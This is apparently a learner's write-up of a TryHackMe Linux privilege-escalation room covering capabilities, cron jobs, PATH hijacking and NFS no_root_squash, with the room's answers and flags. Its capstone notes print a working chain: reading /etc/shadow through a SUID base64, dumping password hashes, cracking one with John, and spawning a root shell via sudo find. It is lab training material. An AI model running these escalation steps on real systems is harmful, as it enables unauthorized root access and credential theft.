![](https://i.imgur.com/6cHBAr1.png)  

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. For a more detailed room on John the Ripper, you can visit [https://tryhackme.com/room/johntheripper0](https://tryhackme.com/room/johntheripper0)

  

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:

  

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

  

![](https://i.imgur.com/bkOGaHY.png)  

  

We will then add this password with a username to the `/etc/passwd` file.

  

![](https://i.imgur.com/huGoEtj.png)

  

Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.

  

![](https://i.imgur.com/HZcWGhi.png)  

Answer the questions below

Which user shares the name of a great comic book writer?
A: gerryconway
What is the password of user2?
A: Password1
What is the content of the flag3.txt file?
A: THM-3847834

## Task 8 Privilege Escalation: Capabilities

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  
The capabilities man page provides detailed information on its usage and options.  
  
We can use the `getcap` tool to list enabled capabilities.

![](https://i.imgur.com/Q6XYr0p.png)

When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.  
  
Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

![](https://i.imgur.com/6csoabB.png)

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.  
  
We notice that vim can be used with the following command and payload:  
  
![](https://i.imgur.com/nlpCMWj.png)  

This will launch a root shell as seen below;

  

![](https://i.imgur.com/jCjvgo3.png)  

Answer the questions below

Complete the task described above on the target system  

How many binaries have set capabilities?
A: 6
What other binary can be used through its capabilities?
A: view
What is the content of the flag4.txt file?
A: THM-9349843

## Task 9 Privilege Escalation: Cron Jobs

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.  
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.  
  
Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.  
  
Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.  
  
Any user can read the file keeping system-wide cron jobs under `/etc/crontab`  
  
While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.  
![](https://i.imgur.com/fwqPuHN.png)  

You can see the `backup.sh` script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.

![](https://i.imgur.com/qlDj93R.png)

As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.  
  
The script will use the tools available on the target system to launch a reverse shell.  
Two points to note;

1.  The command syntax will vary depending on the available tools. (e.g. `nc` will probably not support the `-e` option you may have seen used in other cases)
2.  We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.

The file should look like this;  

![](https://i.imgur.com/579yg6H.png)  

We will now run a listener on our attacking machine to receive the incoming connection.

  

![](https://i.imgur.com/xwYXfY1.png)

  

Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:

1.  System administrators need to run a script at regular intervals.
2.  They create a cron job to do this
3.  After a while, the script becomes useless, and they delete it  
    
4.  They do not clean the relevant cron job

This change management issue leads to a potential exploit leveraging cron jobs.

  

![](https://i.imgur.com/SovymJL.png)

  

  

The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.  
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.  

  

The file on the target system should look familiar:  

![](https://i.imgur.com/SHknR87.png)  

  

The incoming reverse shell connection has root privileges:

![](https://i.imgur.com/EBCue17.png)  

  

In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.

  
  

Answer the questions below

How many user-defined cron jobs can you see on the target system?  
A: 4
What is the content of the flag5.txt file?
A: THM-383000283
What is Matt's password?
A: 123456

## Task 10 Privilege Escalation: PATH

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).  
  
Typically the PATH will look like this:

![](https://i.imgur.com/ch2Z4zp.png)  

If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.

1.  What folders are located under $PATH
2.  Does your current user have write privileges for any of these folders?
3.  Can you modify $PATH?
4.  Is there a script/application you can start that will be affected by this vulnerability?

For demo purposes, we will use the script below:  

![](https://i.imgur.com/qX7m2Jq.png)  

This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.

  

We compile this into an executable and set the SUID bit.

  

![](https://i.imgur.com/A6QQ65I.png)  

Our user now has access to the “path” script with SUID bit set.

  

  

![](https://i.imgur.com/Af1RpuY.png)  

  

Once executed “path” will look for an executable named “thm” inside folders listed under PATH.

  

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege

  

  

A simple search for writable folders can done using the “`find / -writable 2>/dev/null`” command. The output of this command can be cleaned using a simple cut and sort sequence.

  

![](https://i.imgur.com/7UekB3t.png)  

  

Some CTF scenarios can present different folders but a regular system would output something like we see above.

Comparing this with PATH will help us find folders we could use.

  

![](https://i.imgur.com/67mdmmG.png)  

We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders.

  

  

![](https://i.imgur.com/Y3pDsrL.png)  

  

An alternative could be the command below.

`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`

We have added “grep -v proc” to get rid of the many results related to running processes.

  

Unfortunately, subfolders under /usr are not writable

  

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “`export PATH=/tmp:$PATH`” command accomplishes this.

  

![](https://i.imgur.com/u1PM8ZD.png)  

  

At this point the path script will also look under the /tmp folder for an executable named “thm”.

Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.

  

![](https://i.imgur.com/7UdrEnd.png)  

  

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.

  

![](https://i.imgur.com/MlBJ8kb.png)  

  

  

Answer the questions below

What is the odd folder you have write access for?
A: /home/murdoch
Exploit the $PATH vulnerability to read the content of the flag6.txt file.  
A: 
What is the content of the flag6.txt file?
A: THM-736628929

## Task 11 Privilege Escalation: NFS

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

  

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.  
  
Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.  
  
NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

![](https://i.imgur.com/irDQTze.png)  

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.  
  
We will start by enumerating mountable shares from our attacking machine.

![](https://i.imgur.com/CmXPDcv.png)  

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.

  

  

![](https://i.imgur.com/DwAB1qs.png)  

  

As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.

  

![](https://i.imgur.com/nWKpFkK.png)  

  

Once we compile the code we will set the SUID bit.

  

![](https://i.imgur.com/rkZOOjZ.png)  

  

You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).

  

![](https://i.imgur.com/U7IjT38.png)  

  

Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.

Answer the questions below

How many mountable shares can you identify on the target system?  
A: 3
How many shares have the "no_root_squash" option enabled?  
A: 3
Gain a root shell on the target system  

What is the content of the flag7.txt file?
A: THM-89384012

## Task 12 Capstone Challenge

By now you have a fairly good understanding of the main privilege escalation vectors on Linux and this challenge should be fairly easy.

You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root.  
We designed this room to help you build a thorough methodology for Linux privilege escalation that will be very useful in exams such as OSCP and your penetration testing engagements.

Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.

You can access the target machine over your browser or use the SSH credentials below.

-   Username: leonard
-   Password: Penny123

Answer the questions below

What is the content of the flag1.txt file?
A: THM-42828719920544
What is the content of the flag2.txt file?  
A: THM-168824782390238

Created by ![](https://tryhackme-images.s3.amazonaws.com/user-avatars/af7feb2c43a2c7d5f111b98ccbd15048.png) [tryhackme](https://tryhackme.com/p/tryhackme)

This is a **free** room, which means anyone can deploy virtual machines in the room (without being subscribed)! 17035 users are in here and this room is 238 days old.


#### Notes from task 12
[leonard@ip-10-10-209-223 ~]$ cat /proc/version
Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020

[leonard@ip-10-10-209-223 ~]$ cat /etc/shadow
cat: /etc/shadow: Permission denied
[leonard@ip-10-10-209-223 ~]$ cat /etc/passwd | grep home
leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
missy:x:1001:1001::/home/missy:/bin/bash

[leonard@ip-10-10-209-223 ~]$ cat /etc/shadow
cat: /etc/shadow: Permission denied

[leonard@ip-10-10-209-223 ~]$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.209.223  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::c2:65ff:fe95:f735  prefixlen 64  scopeid 0x20<link>
        ether 02:c2:65:95:f7:35  txqueuelen 1000  (Ethernet)
        RX packets 702  bytes 59983 (58.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 530  bytes 86419 (84.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

virbr0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
        ether 52:54:00:1b:aa:dc  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3  bytes 307 (307.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

	[jmk@arch THM]$ nmap -sVC -Pn 10.10.209.223
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-06 16:02 PST
Nmap scan report for 10.10.209.223
Host is up (0.47s latency).
Not shown: 923 filtered tcp ports (no-response), 76 filtered tcp ports (host-unreach)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 95:09:13:a2:6e:3f:8d:21:10:5f:97:47:b1:67:a2:be (RSA)
|   256 04:72:4a:a8:98:77:8f:53:4e:96:98:71:a9:76:8e:45 (ECDSA)
|_  256 2c:74:b8:9f:c3:f2:36:80:4a:51:c4:35:f8:1f:7a:f9 (ED25519)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.70 seconds

[leonard@ip-10-10-209-223 ~]$ find /home -name flag1.txt
find: ‘/home/missy’: Permission denied
find: ‘/home/rootflag’: Permission denied

[leonard@ip-10-10-209-223 ~]$ find / -writable -type d 2>/dev/null
/dev/mqueue
/dev/shm
/proc/3502/task/3502/fd
/proc/3502/fd
/proc/3502/map_files
/run/user/1000
/var/tmp
/tmp
/tmp/.Test-unix
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/home/leonard
/home/leonard/.mozilla
/home/leonard/.mozilla/extensions
/home/leonard/.mozilla/plugins
/home/leonard/.cache
/home/leonard/.cache/abrt
/home/leonard/.config
/home/leonard/.config/abrt
/home/leonard/.local
/home/leonard/.local/share
/home/leonard/perl5

[leonard@ip-10-10-209-223 ~]$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/base64
/usr/bin/ksu
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/newgrp
/usr/bin/staprun
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/Xorg
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/kde4/kpac_dhcp_helper
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
/usr/libexec/qemu-bridge-helper
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/selinux_child
/usr/libexec/sssd/proxy_child
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
/usr/libexec/flatpak-bwrap

[leonard@ip-10-10-209-223 ~]$ getcap -r / 2>/dev/null
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
	
[leonard@ip-10-10-209-223 ~]$ echo $PATH
/home/leonard/scripts:/usr/sue/bin:/usr/lib64/qt-3.3/bin:/home/leonard/perl5/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:/home/leonard/.local/bin:/home/leonard/bin
	
[leonard@ip-10-10-209-223 ~]$ find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
dev
home
proc
run
sys
tmp
usr
var

[leonard@ip-10-10-209-223 ~]$ LFILE=/etc/shadow
[leonard@ip-10-10-209-223 ~]$ /usr/bin/base64 "$LFILE" | base64 --decode
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
pegasus:!!:18785::::::
systemd-network:!!:18785::::::
dbus:!!:18785::::::
polkitd:!!:18785::::::
colord:!!:18785::::::
unbound:!!:18785::::::
libstoragemgmt:!!:18785::::::
saslauth:!!:18785::::::
rpc:!!:18785:0:99999:7:::
gluster:!!:18785::::::
abrt:!!:18785::::::
postfix:!!:18785::::::
setroubleshoot:!!:18785::::::
rtkit:!!:18785::::::
pulse:!!:18785::::::
radvd:!!:18785::::::
chrony:!!:18785::::::
saned:!!:18785::::::
apache:!!:18785::::::
qemu:!!:18785::::::
ntp:!!:18785::::::
tss:!!:18785::::::
sssd:!!:18785::::::
usbmuxd:!!:18785::::::
geoclue:!!:18785::::::
gdm:!!:18785::::::
rpcuser:!!:18785::::::
nfsnobody:!!:18785::::::
gnome-initial-setup:!!:18785::::::
pcp:!!:18785::::::
sshd:!!:18785::::::
avahi:!!:18785::::::
oprofile:!!:18785::::::
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::

	[jmk@arch THM]$ john missy_pass.txt --wordlist=~/Documents/InfoSec/THM/rockyou.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (?)
1g 0:00:00:00 DONE (2022-02-06 16:21) 1.818g/s 7447p/s 7447c/s 7447C/s adriano..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed

[missy@ip-10-10-209-223 Documents]$ cat flag1.txt
THM-42828719920544

[missy@ip-10-10-209-223 home]$ sudo find . -exec /bin/sh \; -quit
sh-4.2# whoami
root

	sh-4.2# cat flag2.txt
THM-168824782390238
